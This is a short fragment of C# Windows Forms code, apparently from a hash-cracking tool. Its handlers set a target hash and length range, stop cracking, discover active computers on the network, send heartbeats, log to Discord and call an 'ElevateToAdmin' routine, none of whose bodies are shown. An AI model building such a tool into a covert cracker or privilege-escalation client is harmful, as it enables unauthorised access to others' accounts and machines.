        private void txtTargetHash_TextChanged(object sender, EventArgs e)
        {
            hash = txtTargetHash.Text;
        }

        private void btnStopCracking_Click(object sender, EventArgs e)
        {
            EmergencySTOP = true;
            Log(new LogMessage(LogSeverity.Info, "Cracking", "Emergency stop triggered."));
        }

        private void txtMax_TextChanged(object sender, EventArgs e)
        {
            MaxLength = Convert.ToInt32(txtMax.Text);
        }

        private void txtMin_TextChanged(object sender, EventArgs e)
        {
            MinLength = Convert.ToInt32(txtMin.Text);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            // Call the FindOthers function
            List<string> activeComputers = FindOthers();

            // Log the active computers
            foreach (var computer in activeComputers)
            {
                Log(new LogMessage(LogSeverity.Info, "Discord", $"Active computer: {computer}"));
            }
        }

        private async void button2_Click(object sender, EventArgs e)
        {
            SendHeartbeat(0);
        }

        private void btnElevate_Click(object sender, EventArgs e)
        {
            // Elevate to admin
            ElevateToAdmin();
        }
    }


}